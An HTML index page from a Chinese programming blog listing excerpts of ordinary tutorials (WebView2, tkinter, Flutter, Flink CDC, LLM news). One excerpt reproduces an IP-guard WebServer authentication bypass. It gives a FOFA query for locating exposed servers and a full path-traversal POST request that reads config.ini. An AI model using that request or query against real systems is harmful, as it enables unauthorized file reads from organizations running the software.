<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="Posts">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d03150ce1ddb975df3d20c619086b5e9/" rel="bookmark">
			WebView2教程(基于C&#43;&#43;)【一】环境初始化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		创建一个VisualStudio C++项目，通过NuGet包管理器安装两个包：
注意，在项目属性页设置项目使用：C++ 20，子系统设置成窗口（相应的预处理器也要改变），DPI识别设置成每个监视器高DPI识别。
附加依赖项设置以下几项：
dwmapi.lib shell32.lib comctl32.lib usp10.lib kernel32.lib user32.lib 新建一个main.cpp代码如下：
#include &lt;Windows.h&gt; #include "App.h" int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPTSTR lpCmdLine, _In_ int nCmdShow) { auto result = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED); if (result != S_OK) { return 0; } App::init(); MSG msg; while (GetMessage(&amp;msg, NULL, 0, 0)) { TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); } CoUninitialize(); return 0; } 这是入口方法，我们在入口方法里初始化了App类
下面是App类的头文件代码如下：
#pragma once #include &lt;Windows.h&gt; #include &lt;fstream&gt; #include &lt;filesystem&gt; #include &lt;wrl.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d03150ce1ddb975df3d20c619086b5e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5f0cb7f93a54bf3468b8753bb8d01c8/" rel="bookmark">
			python设计一个登录界面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		游戏登录界面 1.设计登录界面1.1导入需要的工具包1.2窗口显示1.3登录界面图片显示1.4 用户名设置默认值1.5标签按钮输入框显示 2.登录功能实现2.1用户数据存储2.2登录和注册2.2.1登录功能实现注册功能实现 1.设计登录界面 1.1导入需要的工具包 import tkinter as tk from PIL import Image, ImageTk import pickle from tkinter import messagebox import subprocess 1.2窗口显示 window = tk.Tk() window.title("Welcome") window.geometry('500x600') 1.3登录界面图片显示 image = Image.open("welcome.gif") photo = ImageTk.PhotoImage(image) 1.4 用户名设置默认值 value = "GaoYue" entry_var = tk.StringVar(window) entry_var.set(value) 1.5标签按钮输入框显示 label1_image = tk.Label(window,image=photo) label1_image.place(x=10,y=10) label2 = tk.Label(window,text='User name',width=10,height=5) label2.place(x=40,y=130) label3 = tk.Label(window,text='password',width=10,height=5) label3.place(x=40,y=180) label4 = tk.Entry(window,width=30,bd=5) label4.place(x=140,y=210) label5 = tk.Entry(window,textvariable=entry_var,width=30,bd=5) label5.place(x=140,y=160) button1 = tk.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d5f0cb7f93a54bf3468b8753bb8d01c8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58215ccc4bf44c422905e2714523b768/" rel="bookmark">
			前端用a标签实现静态资源文件(excel/word/pdf)下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		接上文实现的 前端实现将二进制文件流，并下载为excel文件后，
实际项目中一般都会有一个模版下载的功能，一般都由服务端提供一个下载接口，返回文件流或url地址，然后前端再处理成对应需要的类型的文件。
但是，也有可能服务端就不提供下载接口了，那么模版就可以保存在前端项目中。
本文就是基记录如何实现纯前端下载静态资源文件。
本文目录 一、实现原理二、适用场景三、具体实践1、编写方法2、调用3、注意事项 一、实现原理 主要使用a标签，通过动态创建一个包含 download 属性的 a 元素，触发点击事件实现。
在 html5 中，a 标签新增了 download 属性，包含该属性的链接被点击时，浏览器会以下载文件方式下载 href 属性上的链接。
例如：&lt;a href="https://www.baidu.com" download="baidu.html"&gt;下载&lt;/a&gt;
注意：利用a标签实现下载，会导致一个问题，当你下载图片的URL是远程图片url时，将不是下载该文件而是打开该文件。（本文主要演示获取本地资源然后下载，不涉及此中场景。）
二、适用场景 纯前端实现下载功能一般比较适合固定的文件，比如：excel/word/pdf 等固定模版，并不会和数据库有交互。
三、具体实践 1、编写方法 /** * 下载本地文件 * @param {*} path 本地文件路径，注意：必须保存在public文件夹下 * @param {*} name 下载后的文件名 */ const downloadLocalTemplate = (path, name) =&gt; { let a = document.createElement('a'); a.href = path; // 如果后端返回文件地址，path值就是后端返回的地址 a.download = name; // 设置下载文件文件名,要完整的文件名+后缀，比如：test.xlsx a.style.display = 'none'; document.body.appendChild(a); a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/58215ccc4bf44c422905e2714523b768/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74597ab69cb940c35c5172651ef952a3/" rel="bookmark">
			如何在Android Studio中创建Flutter项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第1步：安装 Android Studio 和 Flutter
首先在计算机上按照官方安装指南安裝 Flutter。 完成后，继续从官方网站安装 Android Studio。
第2步：在Android Studio中安裝Flutter SDK
启动 Android Studio。
转到“文件”-&gt;“设置”（在 macOS 上，“Android Studio”-&gt;“首选项”）。
在“设置”窗口中，导航至“语言和框架”-&gt;“Flutter”。单击“Flutter SDK 路径”旁边的“浏览”按钮，然后选择系统上安装 Flutter 的位置。
单击“应用”，然后单击“确定”保存设置。
第3步：创建一个新的Flutter项目
在 Android Studio 欢迎屏幕上单击“Start a new Flutter project”或转到“File”-&gt;“New”-&gt;“New Flutter Project”。
选择“Flutter应用程序”并单击“下一步”。
输入项目名称并选择要创建项目的位置。
选择支持的平台（Android、iOS 或两者）并根据需要设置其他项目配置。 然后单击“下一步”。
选择您想要用于 Flutter 开发的编程语言（Dart 是默认且推荐的选项），然后单击“完成”。
第 4 步：运行您的 Flutter 应用程序
创建项目后，Android Studio 将自动打开 main.dart 文件，其中包含 Flutter 应用程序的入口点。
将 Android 或 iOS 设备连接到计算机，或使用模拟器。
单击 Android Studio 中的绿色“运行”按钮（或按 Shift + F10），在连接的设备或模拟器上运行 Flutter 应用程序。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/74597ab69cb940c35c5172651ef952a3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2271f665aa4d4b462e6970aadcf7a085/" rel="bookmark">
			Flink CDC详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Flink CDC一 CDC简介1.1 CDC定义1.2 CDC应用场景1.3 CDC实现机制1.4 开源CDC工具对比 二 Flink CDC简介2.1 Flink CDC介绍2.2 Flink CDC Connector(连接器)2.3 Flink CDC &amp;&amp; Flink版本2.4 Flink CDC特点 三 Flink CDC发展3.1 发展历程3.2 背景Dynamic Table &amp; ChangeLog Stream 3.3 传统 CDC ETL 分析3.4 基于 Flink CDC 的 ETL 分析Flink CDC 1.x痛点Flink CDC 2.0设计Flink CDC未来规划 四 Table &amp; SQL API应用五 DataStream API应用六 Flink CDC Connector6.1 MySQL CDC 连接器6.2 如何创建 MySQL CDC 表6.3 支持的元数据6.4 动态加表 七 Flink CDC案例一7.1 基于 Flink CDC 构建 MySQL 和 Postgres 的 Streaming ETL7.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2271f665aa4d4b462e6970aadcf7a085/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41ee9e34d59127ccb5a9f7e4037bbbb8/" rel="bookmark">
			js的includes函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在JavaScript中，includes() 是一个数组（Array）和字符串（String）对象的方法，用于确定一个数组是否包含一个特定的值，或者一个字符串是否包含一个特定的子串。如果找到该值或子串，则返回 true；否则返回 false。
数组中的 includes() 对于数组，includes() 方法用于判断一个数组是否包含一个指定的值，根据情况，如果需要，可以指定开始搜索的位置。
语法：
javascript复制代码
arr.includes(valueToFind[, fromIndex]) valueToFind：必需。需要查找的元素值。fromIndex：可选。从该索引处开始查找 valueToFind。如果为负值，则按升序从 array.length + fromIndex 的索引开始搜寻。即使整个数组已经被搜索，fromIndex 仍然会被当作有效位置。如果省略该参数，则整个数组都会被搜索。 示例：
javascript复制代码
const array1 = [1, 2, 3, 4, 5]; console.log(array1.includes(3)); // 输出: true console.log(array1.includes(6)); // 输出: false // 使用 fromIndex console.log(array1.includes(3, 3)); // 输出: false console.log(array1.includes(3, -1)); // 输出: true 字符串中的 includes() 对于字符串，includes() 方法用于判断一个字符串是否包含另一个字符串，或者是否包含指定的子串。
语法：
javascript复制代码
str.includes(searchString[, position]) searchString：必需。要查找的字符串。position：可选。开始搜索的位置。如果省略该参数，则从头开始搜索。 示例：
javascript复制代码
const str = 'Hello, world!'; console.log(str.includes('world')); // 输出: true console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/41ee9e34d59127ccb5a9f7e4037bbbb8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cdab5c9b864c54716308bfcdae03770e/" rel="bookmark">
			【Stable Diffusion系列】（一）：AI绘画本地部署教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、总览
二、本地部署
1、安装cuda
2、安装python
3、安装git 4、方法一 1）获取安装包
2）update
3）run
5、方法二 1）git clone
2）双击webui-user.bat
3）更新 6、设置启动参数
7、可能的问题
问题一
问题二
问题三
问题四
问题五
8、安装ControlNet
三、模型下载地址
四、模型简介
五、后记
一、总览 AI技术势头正盛，俨然成为当前人类社会科技树的主分支。不管你是技术人员，还是其他人员，在生活与工作之中，AI已触手可及。从本文起，我将带你迈进AI绘画的大门，从头创造专属于你的虚拟开放世界。
二、本地部署 建议事先安装python和cuda。
1、安装cuda cuda安装教程参考专栏文章：http://t.csdnimg.cn/uRr1D
2、安装python python选择3.10.6版本，才可使用。
Python Release Python 3.10.6 | Python.org
下拉网页，依据自己的系统选择。
1自定义安装，2勾选加入系统变量。 此页默认
修改安装地址
等待安装完成即可。
最后，点击Disable path length limit。可取消系统变量路径长度限制。
安装完成之后，请换源，具体操作参见：
http://t.csdnimg.cn/6gFn3 pip换源。
3、安装git 官网：Git - Downloads (git-scm.com)
根据自己的系统下载：
第一步，直接next
第二步，修改安装目录
第三步，可保持默认即可，后续一路默认下去。安装结束。
4、方法一 1）获取安装包 新建一个空白文件夹，用于放置stable diffusion。
进入github网址：AUTOMATIC1111/stable-diffusion-webui: Stable Diffusion web UI (github.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cdab5c9b864c54716308bfcdae03770e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac1e483ef7afbc33f4ae2d024691c991/" rel="bookmark">
			LeetCode刷题指南 - 算法必读篇
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以下内容学习labuladong 的算法笔记时，所做的笔记记录，仅供学习使用感谢。
一、算法必读篇 一、框架二、动态规划斐波那契数列凑零钱问题 三、回溯算法全排列问题N 皇后问题 四、BFS算法五、单链表的6大套路1.合并两个有序链表2.合并K个升序链表3.单链表的倒数第 k 个节点4.寻找单链表的中点5.判断单链表是否包含环并找出环起点6.判断两个单链表是否相交并找出交点 六、二分查找1.查找一个数2.查找左侧边界3.查找右侧边界4.总结 七、滑动窗口76 .最小覆盖子串问题567.字符串排列 八、股票问题九、nSum函数问题无序数组有序数组 十、二叉树问题1.**翻转二叉树**2.**填充二叉树节点的右侧指针**3.**将二叉树展开为链表** 十一、01背包问题 一、框架 数组遍历框架，典型的线性迭代结构：
void traverse(int[] arr) { for (int i = 0; i &lt; arr.length; i++) { // 迭代访问 arr[i] } } 链表遍历框架，兼具迭代和递归结构：
/* 基本的单链表节点 */ class ListNode { int val; ListNode next; } void traverse(ListNode head) { for (ListNode p = head; p != null; p = p.next) { // 迭代访问 p.val } } void traverse(ListNode head) { // 递归访问 head.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac1e483ef7afbc33f4ae2d024691c991/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c0d6515d8f96f14e434adb2da688f30/" rel="bookmark">
			Meta 发布Llama 3，能力直逼GPT-4,一己之力拉高开源大模型水位
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Meta麾下“羊驼”一路狂奔在开源的大道上。
在过去的一年里，Llama系列可以说开辟了开源LLM的半壁江山。
嫌弃开源模型能力只有GPT-3.5,不够用?
如今Llama 3发布，又是一石激起千层浪。粗看其基础benchmark，足以让国内外一众大模型公司瑟瑟发抖。借用一句业内人士的话，“性能上来说感觉就是GPT-3.7的水平。一己之力急速拉高了开源水位”。
首先从数据层面看，Llama 3 在15T tokens上进行了训练，践行了又一次堪称恐怖的大力出奇迹；再者从训练资源方面看，2.4万卡集群训练的部署也足以展示Meta的志在必得。
Llama 3让Meta重夺开源大模型的王位，且其性能无限接近甚至超过OpenAI GPT、Gemini和Claude等闭源大模型。
难怪Meta有底气放言，就各自的参数数量而言，经过两个定制的24000 GPU集群训练的Llama 3 8B和Llama 3 70B是目前可用的性能最佳的生成式AI模型之一。
更加劲爆的是。扎克伯格在最新访谈中透露，Llama3的三个版本中，是80亿参数、700亿参数的模型开源了，而超过 4000 亿个模型还在加紧训练的路上……
图片
有网友在访谈下调侃道，难怪扎克伯格看起来如此“人性化”，肯定是偷偷运行Llama 3了！
图片
让小扎都更加AGI的Llama 3，究竟为何能这么牛呢，不妨来一起看看其细节！ 一、性能 PK，刺刀见红：Llama3恐怖如斯 Meta力大砖飞确实有奇效！扎克伯格说，Llama3 80亿的模型几乎与此前发布的最大版本的Llama2（参数700亿）一样强大。
众所周知，诸如MMLU（旨在衡量知识）、ARC（试图衡量技能习得）和DROP（测试模型对文本片段的理解能力）等流行AI基准测试的有效性和实用性尚存争议。但无论好坏，它们仍是AI玩家评估其模型的少数标准化手段之一。
Llama 3 8B在至少九项基准测试中超越了其他开源模型，如Mistral的Mistral 7B和Google的Gemma 7B：MMLU、ARC、DROP、GPQA（一组涉及生物、物理和化学的问题）、HumanEval（一项代码生成测试）、GSM-8K（数学应用题）、MATH（另一项数学基准）、AGIEval（问题解决测试集）以及BIGbench Hard（常识推理评估）。
诚然，Mistral 7B和Gemma 7B并非处于最前沿（Mistral 7B于去年9月发布），并且在Meta引用的几项基准中，Llama 3 8B仅比二者高出几个百分点。但Meta声称，参数数量更大的Llama 3 70B模型，可与包括Google Gemini系列最新款Gemini 1.5 Pro在内的旗舰级生成式AI模型相媲美。 图片
Instruct-tuned模型与Gemma、Mistral、Gemini Pro 1.5、Claude 3 Sonnet在MMLU、GSM-8k等benchmark上的对比如下：
图片
Llama 3 70B在MMLU、HumanEval和GSM-8K三项测试中胜过Gemini 1.5 Pro。尽管它无法与Anthropic表现最为强劲的模型Claude 3 Opus匹敌，但在五个基准（MMLU、GPQA、HumanEval、GSM-8K及MATH）上，Llama 3 70B的成绩优于Claude 3系列中第二弱的模型Claude 3 Sonnet。 为了测试Llama 3在标准基准测试上的性能，Meta甚至特意开发了一个新的高质量人类评估集。这个评估集包含1800个提示，涵盖寻求建议、头脑风暴、角色扮演等12个关键用例。为了测试的公平，评估集不允许自己的建模团队访问。结果是，70B的Llama 3Instruct-tuned模型在人类评测中胜过Claude Sonnet和GPT 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c0d6515d8f96f14e434adb2da688f30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/555041083cb115f1f22e0e51e30ec7c8/" rel="bookmark">
			IP-guard WebServer 权限绕过漏洞复现(QVD-2024-14103)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IP-guard WebServer 权限绕过漏洞复现(QVD-2024-14103) 1.漏洞描述 IP-guard 是由广州市溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。
由于IP-guard WebServer的权限验证机制中存在设计缺陷，远程攻击者能够规避安全验证，通过后端接口执行文件的任意读取和删除操作
影响版本
IP-guard &lt; 4.82.0609.0
fofa语法
icon_hash="2030860561" 2.漏洞复现 用fofa查找了一个IP-guard 服务 进行漏洞复现
POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1 Host: your-ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/x-www-form-urlencoded path=..%2Fconfig.ini&amp;filename=1&amp;action=download&amp;hidGuid=1v%0D%0A 漏洞修复
官方已发布新版本修复漏洞，建议尽快访问官网（https://www.ip-guard.net/）或联系官方售后支持获取版本升级安装包或补丁，升级至4.82.0609.0版本及以上
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc91da8cfb61ebf3bf065ca1c68de6fb/" rel="bookmark">
			【macOS】M芯片安装windows10以及配置office
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 背景 M3芯片Macbook ProParallel Desktop19office word + visio打算配置一个好用的笔记本，携带着尽快把论文的正文写完，macOS里面的word排版可能出错，所以像配置一个双系统，里面必然要有的是word和visio，其他没有要求 踩坑记录 PD19现在默认安装的是Win11，不熟悉，还是想用Win10PD19要自己下载Win10的ISO（必须是Arm版本）进行手动配置，这一步的坑很多，这个资源我尝试了使用uupdump自己制作，但是安装的时候显示我的镜像里没有系统，以后慢慢再玩吧，这次直接在下面的资源里拿来用了Arm的word和visio都要专门下载，资源里也有我还去自己制作Win10的Arm版本的ISO找到或者自己做好了ISO以后，在PD19里安装时，被提醒建议安装家庭版，下拉菜单没选项！真tmd。。。其实是没有显示。。。，按图里的选就行了： 成功路径&amp;细节 首先官网下载PD19，我选择了试用14天，而没有去破解
然后下载windows10的Arm版本的ISO镜像，在B站找了一个 【教程】在M1芯片Mac上安装PD18+Win10(ARM版)，他分享了PD18和win10Arm，他发了PD18的友好交流（pojie方法，他分享的资源里有pojie的文件），我最后使用的是PD19官方版（试用14天），win10我是用的它分享的，但是可能版本比较老了，所以安装完成以后，会提醒更新，暂时这样先用着
然后就是按照常规方法，在PD19里面，手动选择自己的镜像去安装，这一步很简单，如果出现芯片的问题，按照图里操作：
WIn10装好了，下面是word和visio，这里我先用了吉大正版下载的ISO，但是不让我装载，我转去直接下载了exe安装方法，资源也在网盘保存了，这里保存了是博主的资源，这里使用了64位的内容，选择了exe直接安装的方式
路径是很清晰地，主要是资源不匹配，这才是困难
经验总结 这个up M1芯片Macbook如何下载ARM版Windows10镜像在官网直接找到了Arm的Windows10，他是21年发的，现在找不到了，但官网找东西是基操，这是方法，记录下来
M3的macOS真的快，网速、传输、安装速度都快的离谱小结一下：PD19 → win10 arm → office word&amp;visio PD19（官网试用，也有友好交流版，这次没测试）win10 arm （用的是up直接发的，版本旧、被提示更新，这次先用着）office word&amp;visio（要用64位exe安装，而不能用iso装载，资源也是up分享的）资源都保存在了百度网盘，以后再用会方便些 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/425e754424db983eec15d2cf65980d9b/" rel="bookmark">
			echarts图表动态监听dataZoom滑动，控制柱条的宽度以及数值的显示隐藏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当数值过多时，显示所有柱条看着会很凌乱且文字会挤在一起，于是就需要监听datazoom的滑动，拿到对应的阈值后做出相应的配置。
“dataZoom” 事件通常用于响应用户对图表进行数据缩放的操作。
这里是datazoom官网api地址：点击跳转至官网文档的datazoom介绍
初始时状态如下图：
滑动x轴至设定范围内时：
目录 监听datazoomparams值获取图表的option控制柱条宽度及数值的显示与隐藏 全部代码(echarts示例可直接粘贴使用) 监听datazoom myChart为图表元素，在 “dataZoom” 事件上绑定了一个回调函数，当用户在图表上使用数据缩放时，这个回调函数会被触发。
import * as echarts from 'echarts'; var chartDom = document.getElementById('main'); var myChart = echarts.init(chartDom); myChart.on("dataZoom", function (params) { }) params值 这里可以获取到当前datazoom的开始位置(start)和结束位置(end)
获取图表的option myChart.getOption() 和 myChart.setOption(newoption) 是 Echarts 中常用的两个方法，它们分别用于获取当前图表的配置选项和设置新的配置选项。
myChart.getOption():
作用：该方法用于获取当前图表的配置选项对象。可以在需要获取当前配置选项时调用该方法，例如在事件回调中根据当前配置进行进一步处理或修改。
返回值：返回一个包含当前图表配置的 JavaScript 对象，可以包含图表类型、数据系列、样式设置等信息。
以下为myChart.getOption()返回的值，若有其他需要控制的，都可以举一反三，根据这些值的位置对其进行设置，不局限于本文的控制柱条的宽度以及数值的显示隐藏。
myChart.setOption(newoption):
作用：该方法用于设置新的配置选项对象，即更新图表的显示内容和样式。通过设置新的配置选项，可以动态改变图表的展示效果，包括数据、样式、主题等。
参数：接受一个新的配置选项对象作为参数，用于更新图表的配置。 返回值：并不返回特定的数值，但会触发图表的重新渲染以反映新的配置选项。
控制柱条宽度及数值的显示与隐藏 这里通过循环图表的option配置中的series数组，设置其数值文本是否显示，以及柱条宽度
series.label.show 和 series.barWidth
// 在用户使用数据缩放时触发该事件 myChart.on('dataZoom', function (params) { // 输出参数信息到控制台 console.log('params', params); // 获取当前图表的配置选项 var newoption = myChart.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/425e754424db983eec15d2cf65980d9b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb3ad6146ee9476aa781d7e8dd22f24b/" rel="bookmark">
			JSON parse error: Cannot deserialize value of type `java.lang.String` from Object value (token `Json
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个错误是因为 Jackson 在尝试将 JSON 数据反序列化为 Java 对象时，遇到了一个无法处理的情况：它期望一个字符串值，但实际上遇到了一个对象开始符号 `{`。这通常发生在 JSON 数据结构与 Java 类型不匹配的情况下。
1. Java 类中定义了一个字段为 `java.lang.String` 类型，但 JSON 数据中该字段的值实际上是一个对象或数组。请确保 JSON 数据的结构与 Java 类型定义匹配。您可能需要调整 Java 类的定义或解析 JSON 数据的方式。
2. JSON 数据中包含了额外的字段，而 Java 类中没有相应的字段来接收这些值。您可以添加相应的字段或使用 `@JsonIgnoreProperties(ignoreUnknown = true)` 注解忽略未知字段。
3. JSON 数据中有一些 null 值或缺失字段，导致 Jackson 无法正确地进行反序列化。您可以使用 `@JsonInclude(Include.NON_NULL)` 注解或设置相应的配置来处理缺失字段或 null 值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94a3f75bf8865ff1bab1ce76d2470afb/" rel="bookmark">
			javax.net.ssl.SSLException: closing inbound before receiving peer‘s close_notify 错误解决，同时支持开启SSL认证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、错误描述 最近将springboot从2.x升级到3.x后，服务后台一直报javax.net.ssl.SSLException: closing inbound before receiving peer‘s close_notify 异常，但是服务可以正常访问。
二、原因分析 升级springboot3.x后，项目使用的mysql驱动版本未进行调整，因此分析原因可能是SpringBoot3.x与MYSQL驱动不兼容导致，大多数网友给的解决方案都是数据库连接添加 useSSL=false 的设置，如果不需要SLL认证的话可以这样处理。但是大多数情况下本身就是要求我们用SSL方式连接数据库，那么需要使用SSL方式连接数据库我们应该怎么解决呢？
三、解决方案 1、如果不要求使用SSL方式连接，参考广大网友的方案，数据库连接添加 useSSL=false 的设置即可。
2、如果需要使用SSL方式连接，则需要解决SpringBoot3.x与MYSQL版本不兼容的问题，我们将mysql-connector-java包进行替换即可。
替换前
&lt;!-- mysql --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;version&gt;8.0.13&lt;/version&gt; &lt;/dependency&gt; 替换后
&lt;!-- mysql --&gt; &lt;dependency&gt; &lt;groupId&gt;com.mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;version&gt;8.3.0&lt;/version&gt; &lt;/dependency&gt; 注意：不只是版本的替换，groupId和artifactId也不一样！
注意：不只是版本的替换，groupId和artifactId也不一样！
注意：不只是版本的替换，groupId和artifactId也不一样！
通过上述依赖包替换后，控制台不再报javax.net.ssl.SSLException: closing inbound before receiving peer‘s close_notify 异常，问题成功解决！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/170840a96b5ffaed26ac2a4ad7e81398/" rel="bookmark">
			使用kafka-clients依赖 集成kafka
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.导入依赖配置 pom文件 XML
&lt;!--公司是对apache的进一步封装--&gt;
&lt;dependency&gt;
&lt;groupId&gt;com.ky.common&lt;/groupId&gt;
&lt;artifactId&gt;ky-common-kafka&lt;/artifactId&gt;
&lt;version&gt;1.8-SNAPSHOT&lt;/version&gt;
&lt;/dependency&gt;
&lt;!--调用的实质是--&gt;
&lt;dependency&gt;
&lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;
&lt;artifactId&gt;kafka-clients&lt;/artifactId&gt;
&lt;version&gt;2.8.0&lt;/version&gt;
&lt;/dependency&gt;
&lt;!--但一般spring集成kafka使用如下方案--&gt;
&lt;dependency&gt;
&lt;groupId&gt;org.springframework.kafka&lt;/groupId&gt;
&lt;artifactId&gt;spring-kafka&lt;/artifactId&gt;
&lt;/dependency&gt;
yaml文件 在项目的yaml中增加相关依赖信息，如公司业务项目中的
YAML
kafka:
bootstrap:
servers: 172.16.39.227:9092
#阿里云kafka集群
ali_bootstrap:
servers: 172.17.0.34:9092
configuration类 简单情境下，直接使用kafka进行测试可以在producer和customer类中写，为求模块化，这里才开使用，合并以及拆开都不影响使用。
kafkaProducer类 Java
public abstract class AbstractKafkaProducer{
// 需要bean类实现的
public abstract KafkaProducerConfig getConfig();
// 内部提供的函数
public void send(String topic,String key,String vlaue){
this.getProducer().send(new ProducerRecord(topic,key,value);
}
// 内部1： 在bean注入后第一时间执行
@PostConstruct
public Producer&lt;String, String&gt; initProducer() {
if (this.producer != null) {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/170840a96b5ffaed26ac2a4ad7e81398/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98b901bcc3cb8ef6da87a1d990b80204/" rel="bookmark">
			【AIGC调研系列】Phi-3 VS Llama3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2024-04-24日发布的Phi-3系列模型在多个方面展现出了对Llama-3的性能优势。首先，Phi-3-small（7B参数）在MMLU上的得分高于Llama-3-8B-Instruct模型，分别为75.3%和66%[1]。此外，具有3.8B参数的Phi-3 Mini在性能上优于Llama3 8b[3]，并且在多项基准测试中超过了Llama 3 8B[12]。我搜索到的资料表明，在小模型尺寸下，Phi-3系列模型展现出了显著的性能优势。
尽管Llama-3在代码生成等任务上实现了全面领先，并且在多个关键的基准测试中性能优于业界先进同类模型[7][8][9]，但Phi-3系列模型通过其高质量数据集的训练，以及特别设计以支持多语言和兼容性[4][12][13]，展现了其在不同领域的强大能力。特别是，Phi-3系列模型被优化至可在手机端运行，这一点对于移动设备用户来说是一个重要的优势[4][5][10]。
